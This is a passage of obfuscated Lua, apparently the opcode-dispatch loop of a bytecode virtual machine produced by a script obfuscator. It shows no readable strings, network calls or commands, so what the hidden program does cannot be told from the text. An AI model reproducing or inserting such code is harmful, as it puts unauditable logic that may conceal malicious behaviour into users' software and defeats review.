break;end;end;n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))elseif z<47 then local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]]*y[554];n=n+1;y=f[n];w[y[548]]=w[y[613]]+w[y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]]+w[y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))else local ba;w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]][y[613]]=y[554];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))end;elseif 71>=z then if 59>=z then if(z<53 or z==53)then if z<=50 then if(48>z or 48==z)then w[y[548]]=(w[y[613]]+w[y[554]]);elseif 49==z then if(w[y[548]]<w[y[554]]or w[y[548]]==w[y[554]])then n=n+1;else n=y[613];end;else local ba=y[548]local bb={}for bc=1,#v do local bd=v[bc]for be=1,#bd do local bd=bd[be]local be,be=bd[1],bd[2]if be>=ba then bb[be]=w[be]bd[1]=bb v[bc]=nil;end end end end;elseif(51>z or 51==z)then w[y[548]]=w[y[613]]+y[554];elseif(53>z)then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[548]]=w[y[613]][y[554]];else if ba==1 then n=n+1;else y=f[n];end end else if ba<=4 then if 3==ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if ba==5 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if 8<ba then w[y[548]][y[613]]=w[y[554]];else y=f[n];end end else if ba<=11 then if 11>ba then n=n+1;else y=f[n];end else if ba==12 then n=y[613];else break end end end end ba=ba+1 end else local ba,bb,bc,bd,be=0 while true do if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 2~=ba then bc,bd=nil else be=nil end end else if ba<=3 then w[y[548]]=j[y[613]];else if ba==4 then n=n+1;else y=f[n];end end end else if ba<=8 then if ba<=6 then w[y[548]]=w[y[613]];else if ba==7 then n=n+1;else y=f[n];end end else if ba<=9 then w[y[548]]=y[613];else if ba~=11 then n=n+1;else y=f[n];end end end end else if ba<=17 then if ba<=14 then if ba<=12 then w[y[548]]=y[613];else if ba<14 then n=n+1;else y=f[n];end end else if ba<=15 then w[y[548]]=y[613];else if ba~=17 then n=n+1;else y=f[n];end end end else if ba<=20 then if ba<=18 then be=y[548]else if ba>19 then p=bd+be-1 else bc,bd=i(w[be](r(w,be+1,y[613])))end end else if ba<=21 then bb=0;else if 22==ba then for bd=be,p do bb=bb+1;w[bd]=bc[bb];end;else break end end end end end ba=ba+1 end end;elseif(56==z or 56>z)then if(z==54 or z<54)then local ba=0 while true do if(ba==6 or ba<6)then if(ba<2 or ba==2)then if(ba<0 or ba==0)then w[y[548]]=w[y[613]][y[554]];else if 2>ba then n=(n+1);else y=f[n];end end else if(ba==4 or ba<4)then if(3<ba)then n=(n+1);else w[y[548]]=w[y[613]][y[554]];end else if ba<6 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end else if(ba<=9)then if((ba<7)or(ba==7))then n=(n+1);else if(not(ba==9))then y=f[n];else w[y[548]][y[613]]=w[y[554]];end end else if(ba<=11)then if not(ba==11)then n=(n+1);else y=f[n];end else if ba<13 then n=y[613];else break end end end end ba=(ba+1)end elseif(z>55)then local ba,bb=0 while true do if ba<=12 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 2>ba then w={};else for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;end end else if ba<=3 then n=n+1;else if 4==ba then y=f[n];else w[y[548]]=h[y[613]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if 7==ba then y=f[n];else w[y[548]]=j[y[613]];end end else if ba<=10 then if 9<ba then y=f[n];else n=n+1;end else if 11==ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end end end else if ba<=18 then if ba<=15 then if ba<=13 then y=f[n];else if ba>14 then n=n+1;else w[y[548]]=y[613];end end else if ba<=16 then y=f[n];else if 18~=ba then w[y[548]]=y[613];else n=n+1;end end end else if ba<=21 then if ba<=19 then y=f[n];else if 20==ba then w[y[548]]=y[613];else n=n+1;end end else if ba<=23 then if 22<ba then bb=y[548]else y=f[n];end else if 24==ba then w[bb]=w[bb](r(w,bb+1,y[613]))else break end end end end end ba=ba+1 end else local ba=y[548]local bb={w[ba](r(w,ba+1,p))};local bc=0;for bd=ba,y[554]do bc=(bc+1);w[bd]=bb[bc];end end;elseif(57>=z)then local ba,bb=0 while true do if ba<=12 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 2~=ba then w={};else for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;end end else if ba<=3 then n=n+1;else if 4==ba then y=f[n];else w[y[548]]=h[y[613]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if ba==7 then y=f[n];else w[y[548]]=j[y[613]];end end else if ba<=10 then if ba<10 then n=n+1;else y=f[n];end else if 12>ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end end end else if ba<=18 then if ba<=15 then if ba<=13 then y=f[n];else if 15>ba then w[y[548]]=y[613];else n=n+1;end end else if ba<=16 then y=f[n];else if 17<ba then n=n+1;else w[y[548]]=y[613];end end end else if ba<=21 then if ba<=19 then y=f[n];else if 20<ba then n=n+1;else w[y[548]]=y[613];end end else if ba<=23 then if 23>ba then y=f[n];else bb=y[548]end else if 25>ba then w[bb]=w[bb](r(w,bb+1,y[613]))else break end end end end end ba=ba+1 end elseif z~=59 then w[y[548]]=(w[y[613]]*y[554]);else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba==0 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba>3 then n=n+1;else w[y[548]]=j[y[613]];end end end else if ba<=6 then if 5==ba then y=f[n];else w[y[548]]=w[y[613]][y[554]];end else if ba<=7 then n=n+1;else if 8==ba then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end else if ba<=14 then if ba<=11 then if 10==ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[548]]=w[y[613]][y[554]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba~=16 then bd=y[548]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba==18 then for be=bd,y[554]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif z<=65 then if 62>=z then if z<=60 then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 0==ba then bb=nil else w[y[548]]=w[y[613]][w[y[554]]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if 5>ba then w[y[548]]=w[y[613]];else n=n+1;end else if ba<=6 then y=f[n];else if ba>7 then n=n+1;else w[y[548]]=y[613];end end end end else if ba<=13 then if ba<=10 then if 10~=ba then y=f[n];else w[y[548]]=y[613];end else if ba<=11 then n=n+1;else if 12==ba then y=f[n];else w[y[548]]=y[613];end end end else if ba<=15 then if ba<15 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[548]else if 18~=ba then w[bb]=w[bb](r(w,bb+1,y[613]))else break end end end end end ba=ba+1 end elseif(z<62)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[548]]=h[y[613]];end else if 3~=ba then n=n+1;else y=f[n];end end else if ba<=5 then if 4<ba then n=n+1;else w[y[548]]=y[613];end else if 6<ba then w[y[548]]=y[613];else y=f[n];end end end else if ba<=11 then if ba<=9 then if ba~=9 then n=n+1;else y=f[n];end else if 11~=ba then w[y[548]]=y[613];else n=n+1;end end else if ba<=13 then if 13>ba then y=f[n];else bb=y[548]end else if 14<ba then break else w[bb]=w[bb](r(w,bb+1,y[613]))end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba>0 then w[y[548]][y[613]]=w[y[554]];else bb=nil end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if 4<ba then n=n+1;else w[y[548]]={};end else if 7~=ba then y=f[n];else w[y[548]][y[613]]=y[554];end end end else if ba<=11 then if ba<=9 then if 8==ba then n=n+1;else y=f[n];end else if 11>ba then w[y[548]][y[613]]=w[y[554]];else n=n+1;end end else if ba<=13 then if 12<ba then bb=y[548]else y=f[n];end else if ba~=15 then w[bb]=w[bb](r(w,bb+1,y[613]))else break end end end end ba=ba+1 end end;elseif(63==z or 63>z)then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[548]]=w[y[613]][y[554]];else if ba==1 then n=n+1;else y=f[n];end end else if ba<=4 then if 3==ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if ba>5 then w[y[548]]=w[y[613]][y[554]];else y=f[n];end end end else if ba<=9 then if ba<=7 then n=n+1;else if 9~=ba then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end else if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if 13>ba then w[y[548]]=w[y[613]][w[y[554]]];else break end end end end ba=ba+1 end elseif z<65 then w[y[548]]=w[y[613]];else local ba=y[548]local bb={w[ba](r(w,ba+1,y[613]))};local bc=0;for bd=ba,y[554]do bc=bc+1;w[bd]=bb[bc];end;end;elseif 68>=z then if(66>=z)then local ba,bb=0 while true do if ba<=16 then if(ba<7 or ba==7)then if(ba<3 or ba==3)then if(ba<=1)then if(ba<1)then bb=nil else w[y[548]]=w[y[613]][y[554]];end else if 2==ba then n=n+1;else y=f[n];end end else if(ba<5 or ba==5)then if not(ba==5)then w[y[548]]=h[y[613]];else n=(n+1);end else if 6<ba then w[y[548]]=w[y[613]][y[554]];else y=f[n];end end end else if(ba==11 or ba<11)then if(ba==9 or ba<9)then if ba~=9 then n=(n+1);else y=f[n];end else if not(11==ba)then w[y[548]]={};else n=n+1;end end else if(ba==13 or ba<13)then if ba==12 then y=f[n];else w[y[548]]=h[y[613]];end else if ba<=14 then n=n+1;else if not(ba==16)then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end end else if ba<=24 then if ba<=20 then if ba<=18 then if not(ba==18)then n=n+1;else y=f[n];end else if ba>19 then n=(n+1);else w[y[548]]=h[y[613]];end end else if(ba<=22)then if(ba==21)then y=f[n];else w[y[548]]={};end else if not(23~=ba)then n=n+1;else y=f[n];end end end else if ba<=28 then if ba<=26 then if 26~=ba then w[y[548]]=h[y[613]];else n=n+1;end else if 28>ba then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end else if(ba==30 or ba<30)then if 30~=ba then n=n+1;else y=f[n];end else if(ba==31 or ba<31)then bb=y[548]else if not(ba~=32)then w[bb]=w[bb]()else break end end end end end end ba=ba+1 end elseif not(z==68)then local ba,bb=0 while true do if ba<=13 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if 1<ba then n=n+1;else w[y[548]]={};end end else if ba<=4 then if ba<4 then y=f[n];else w[y[548]]=h[y[613]];end else if 6~=ba then n=n+1;else y=f[n];end end end else if ba<=9 then if ba<=7 then w[y[548]]=w[y[613]][y[554]];else if 8==ba then n=n+1;else y=f[n];end end else if ba<=11 then if ba==10 then w[y[548]][y[613]]=w[y[554]];else n=n+1;end else if 13~=ba then y=f[n];else w[y[548]]=j[y[613]];end end end end else if ba<=20 then if ba<=16 then if ba<=14 then n=n+1;else if 16~=ba then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end else if ba<=18 then if 18>ba then n=n+1;else y=f[n];end else if ba~=20 then w[y[548]]=j[y[613]];else n=n+1;end end end else if ba<=23 then if ba<=21 then y=f[n];else if 23>ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end else if ba<=25 then if 25>ba then y=f[n];else bb=y[548]end else if ba==26 then w[bb]=w[bb]()else break end end end end end ba=ba+1 end else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3<ba then n=n+1;else w[y[548]]=h[y[613]];end end end else if ba<=6 then if ba<6 then y=f[n];else w[y[548]]=h[y[613]];end else if ba<=7 then n=n+1;else if 8<ba then w[y[548]]=w[y[613]][y[554]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if ba<=12 then w[y[548]]=w[y[613]][w[y[554]]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba==15 then bd=y[548]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 18==ba then for be=bd,y[554]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif(z==69 or z<69)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[548]]=j[y[613]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba>4 then n=n+1;else w[y[548]]=y[613];end else if 6==ba then y=f[n];else w[y[548]]=w[y[613]][w[y[554]]];end end end else if ba<=11 then if ba<=9 then if ba==8 then n=n+1;else y=f[n];end else if ba<11 then w[y[548]]=w[y[613]];else n=n+1;end end else if ba<=13 then if 13~=ba then y=f[n];else bb=y[548]end else if ba<15 then w[bb]=w[bb](w[bb+1])else break end end end end ba=ba+1 end elseif not(z==71)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba<1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4>ba then w[y[548]]=h[y[613]];else n=n+1;end end end else if ba<=6 then if ba~=6 then y=f[n];else w[y[548]]=h[y[613]];end else if ba<=7 then n=n+1;else if ba<9 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end else if ba<=14 then if ba<=11 then if ba<11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[548]]=w[y[613]][w[y[554]]];else if 13==ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[548]end else if ba<=17 then bb=0;else if 19~=ba then for be=bd,y[554]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[548]]=h[y[613]];end else if 3~=ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba<5 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if ba==6 then y=f[n];else w[y[548]]=y[613];end end end else if ba<=11 then if ba<=9 then if 9>ba then n=n+1;else y=f[n];end else if 10==ba then w[y[548]]=y[613];else n=n+1;end end else if ba<=13 then if ba~=13 then y=f[n];else bb=y[548]end else if ba==14 then w[bb]=w[bb](r(w,bb+1,y[613]))else break end end end end ba=ba+1 end end;elseif z<=83 then if 77>=z then if 74>=z then if(72>z or 72==z)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba>0 then bc=nil else bb=nil end else if ba<=2 then bd=nil else if ba==3 then w[y[548]]=h[y[613]];else n=n+1;end end end else if ba<=6 then if ba~=6 then y=f[n];else w[y[548]]=h[y[613]];end else if ba<=7 then n=n+1;else if 9>ba then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end else if ba<=14 then if ba<=11 then if ba>10 then y=f[n];else n=n+1;end else if ba<=12 then w[y[548]]=w[y[613]][w[y[554]]];else if ba>13 then y=f[n];else n=n+1;end end end else if ba<=16 then if 16~=ba then bd=y[548]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba>18 then break else for be=bd,y[554]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=ba+1 end elseif z>73 then w[y[548]][w[y[613]]]=w[y[554]];else if(not(w[y[548]]==y[554]))then n=n+1;else n=y[613];end;end;elseif z<=75 then local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))elseif z>76 then local ba;local bb;local bc;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];bc=y[613];bb=y[554];ba=k(w,g,bc,bb);w[y[548]]=ba;else local ba;w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba]()end;elseif 80>=z then if(78>z or 78==z)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[548]]=j[y[613]];end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if 4==ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if 6<ba then w[y[548]]=h[y[613]];else y=f[n];end end end else if ba<=11 then if ba<=9 then if 8==ba then n=n+1;else y=f[n];end else if 11>ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end else if ba<=13 then if ba~=13 then y=f[n];else bb=y[548]end else if ba==14 then w[bb]=w[bb](w[bb+1])else break end end end end ba=ba+1 end elseif(80>z)then w={};for ba=0,u,1 do if(ba<o)then w[ba]=s[ba+1];else break;end;end;else w[y[548]]=w[y[613]][w[y[554]]];end;elseif 81>=z then w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];if w[y[548]]then n=n+1;else n=y[613];end;elseif z<83 then local ba=y[548];local bb=y[554];local bc=ba+2;local bd={w[ba](w[ba+1],w[bc])};for be=1,bb do w[bc+be]=bd[be];end local ba=w[ba+3];if ba then w[bc]=ba;n=y[613];else n=n+1 end;else local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](w[ba+1])end;elseif 89>=z then if z<=86 then if z<=84 then local ba;w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))elseif z==85 then local ba=y[548]local bb={w[ba](w[ba+1])};local bc=0;for bd=ba,y[554]do bc=bc+1;w[bd]=bb[bc];end else local ba;local bb;w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]={r({},1,y[613])};n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];bb=y[548];ba=w[bb];for bc=bb+1,y[613]do t(ba,w[bc])end;end;elseif z<=87 then local ba=y[548]local bb,bc=i(w[ba](r(w,ba+1,y[613])))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;elseif z==88 then if(w[y[548]]~=w[y[554]])then n=n+1;else n=y[613];end;else local ba;w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba]()end;elseif z<=92 then if 90>=z then local ba;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))elseif 92>z then local ba=y[548]w[ba]=w[ba](r(w,ba+1,p))else w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];if w[y[548]]then n=n+1;else n=y[613];end;end;elseif z<=93 then local ba;w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))elseif z>94 then if(w[y[548]]~=w[y[554]])then n=n+1;else n=y[613];end;else local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=true;n=n+1;y=f[n];ba=y[548]w[ba]=w[ba](r(w,ba+1,y[613]))end;elseif 143>=z then if 119>=z then if 107>=z then if z<=101 then if z<=98 then if z<=96 then local ba,bb=0 while true do if ba<=79 then if ba<=39 then if ba<=19 then if ba<=9 then if ba<=4 then if ba<=1 then if ba>0 then w[y[548]]=h[y[613]];else bb=nil end else if ba<=2 then n=n+1;else if ba~=4 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end else if ba<=6 then if ba>5 then y=f[n];else n=n+1;end else if ba<=7 then w[y[548]]=h[y[613]];else if ba~=9 then n=n+1;else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if ba<=12 then y=f[n];else if 14>ba then w[y[548]][w[y[613]]]=w[y[554]];else n=n+1;end end end else if ba<=16 then if ba>15 then w[y[548]]=h[y[613]];else y=f[n];end else if ba<=17 then n=n+1;else if 19~=ba then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end end else if ba<=29 then if ba<=24 then if ba<=21 then if ba>20 then y=f[n];else n=n+1;end else if ba<=22 then w[y[548]]=h[y[613]];else if 23==ba then n=n+1;else y=f[n];end end end else if ba<=26 then if 25<ba then n=n+1;else w[y[548]]=w[y[613]][y[554]];end else if ba<=27 then y=f[n];else if ba<29 then w[y[548]][w[y[613]]]=w[y[554]];else n=n+1;end end end end else if ba<=34 then if ba<=31 then if 30==ba then y=f[n];else w[y[548]]=h[y[613]];end else if ba<=32 then n=n+1;else if 33==ba then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end else if ba<=36 then if 35==ba then n=n+1;else y=f[n];end else if ba<=37 then w[y[548]]=h[y[613]];else if ba==38 then n=n+1;else y=f[n];end end end end end end else if ba<=59 then if ba<=49 then if ba<=44 then if ba<=41 then if 41>ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if ba<=42 then y=f[n];else if 44>ba then w[y[548]][w[y[613]]]=w[y[554]];else n=n+1;end end end else if ba<=46 then if 46~=ba then y=f[n];else w[y[548]]=h[y[613]];end else if ba<=47 then n=n+1;else if 48==ba then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end else if ba<=54 then if ba<=51 then if ba~=51 then n=n+1;else y=f[n];end else if ba<=52 then w[y[548]]=h[y[613]];else if ba<54 then n=n+1;else y=f[n];end end end else if ba<=56 then if ba~=56 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if ba<=57 then y=f[n];else if 58==ba then w[y[548]][w[y[613]]]=w[y[554]];else n=n+1;end end end end end else if ba<=69 then if ba<=64 then if ba<=61 then if 60==ba then y=f[n];else w[y[548]]=h[y[613]];end else if ba<=62 then n=n+1;else if ba==63 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end else if ba<=66 then if 65==ba then n=n+1;else y=f[n];end else if ba<=67 then w[y[548]]=h[y[613]];else if ba<69 then n=n+1;else y=f[n];end end end end else if ba<=74 then if ba<=71 then if ba==70 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if ba<=72 then y=f[n];else if ba~=74 then w[y[548]][w[y[613]]]=w[y[554]];else n=n+1;end end end else if ba<=76 then if ba~=76 then y=f[n];else w[y[548]]=h[y[613]];end else if ba<=77 then n=n+1;else if ba~=79 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end end end end else if ba<=119 then if ba<=99 then if ba<=89 then if ba<=84 then if ba<=81 then if 80<ba then y=f[n];else n=n+1;end else if ba<=82 then w[y[548]]=h[y[613]];else if ba==83 then n=n+1;else y=f[n];end end end else if ba<=86 then if ba~=86 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if ba<=87 then y=f[n];else if ba~=89 then w[y[548]][w[y[613]]]=w[y[554]];else n=n+1;end end end end else if ba<=94 then if ba<=91 then if ba>90 then w[y[548]]=h[y[613]];else y=f[n];end else if ba<=92 then n=n+1;else if ba>93 then w[y[548]]=w[y[613]][y[554]];else y=f[n];end end end else if ba<=96 then if 96>ba then n=n+1;else y=f[n];end else if ba<=97 then w[y[548]]=h[y[613]];else if 98<ba then y=f[n];else n=n+1;end end end end end else if ba<=109 then if ba<=104 then if ba<=101 then if ba>100 then n=n+1;else w[y[548]]=w[y[613]][y[554]];end else if ba<=102 then y=f[n];else if ba>103 then n=n+1;else w[y[548]][w[y[613]]]=w[y[554]];end end end else if ba<=106 then if 105==ba then y=f[n];else w[y[548]]=h[y[613]];end else if ba<=107 then n=n+1;else if ba<109 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end else if ba<=114 then if ba<=111 then if ba~=111 then n=n+1;else y=f[n];end else if ba<=112 then w[y[548]]=h[y[613]];else if 113<ba then y=f[n];else n=n+1;end end end else if ba<=116 then if 115==ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if ba<=117 then y=f[n];else if ba<119 then w[y[548]][w[y[613]]]=w[y[554]];else n=n+1;end end end end end end else if ba<=139 then if ba<=129 then if ba<=124 then if ba<=121 then if ba~=121 then y=f[n];else w[y[548]]=h[y[613]];end else if ba<=122 then n=n+1;else if 124>ba then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end else if ba<=126 then if 125<ba then y=f[n];else n=n+1;end else if ba<=127 then w[y[548]]=h[y[613]];else if ba>128 then y=f[n];else n=n+1;end end end end else if ba<=134 then if ba<=131 then if 130==ba then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if ba<=132 then y=f[n];else if 134~=ba then w[y[548]][w[y[613]]]=w[y[554]];else n=n+1;end end end else if ba<=136 then if ba==135 then y=f[n];else w[y[548]]=h[y[613]];end else if ba<=137 then n=n+1;else if ba<139 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end end else if ba<=149 then if ba<=144 then if ba<=141 then if 140<ba then y=f[n];else n=n+1;end else if ba<=142 then w[y[548]]=h[y[613]];else if ba~=144 then n=n+1;else y=f[n];end end end else if ba<=146 then if ba>145 then n=n+1;else w[y[548]]=w[y[613]][y[554]];end else if ba<=147 then y=f[n];else if ba~=149 then w[y[548]][w[y[613]]]=w[y[554]];else n=n+1;end end end end else if ba<=154 then if ba<=151 then if ba==150 then y=f[n];else w[y[548]]=j[y[613]];end else if ba<=152 then n=n+1;else if ba>153 then w[y[548]]=w[y[613]];else y=f[n];end end end else if ba<=156 then if ba<156 then n=n+1;else 